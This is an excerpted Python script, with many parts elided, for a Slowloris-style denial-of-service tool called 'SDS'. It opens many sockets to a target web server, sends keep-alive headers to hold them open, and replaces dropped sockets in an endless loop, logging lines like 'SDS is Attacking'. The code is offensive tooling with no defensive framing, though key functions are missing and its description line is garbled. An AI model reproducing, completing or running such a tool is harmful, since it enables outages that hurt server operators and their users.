...
parser = argparse.ArgumentParser(
    description="SDS, this high bandwidth for web servers"
)
...
def slowloris_iteration():
    logging.info("SDS is Sending alive-headers to the target web server ...")
    logging.info("SDS attacking Sockets count: %s", len(list_of_sockets))
...
#     Some of the sockets may have been closed due to errors or timeouts.
 #    Re-create new sockets to replace them until we reach the desired number.
    ...
    logging.info(" SDS is Creating %s new attacking Sockets...", diff)
    for _ in range(diff):
        try:
...
def main():
    ...
    logging.info("SDS is Attacking %s with %s Sockets.", ip, socket_count)

    logging.info("SDS Sockets HIT the target...")
    for _ in range(socket_count):
        try:
            logging.debug("SDS socket hit the target nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
    ...
    while True:
        try:
            ...
            logging.info("Stopping SDS Web Attack")
            break
        except Exception as e:
            logging.debug("Error in SDS iteration: %s", e)
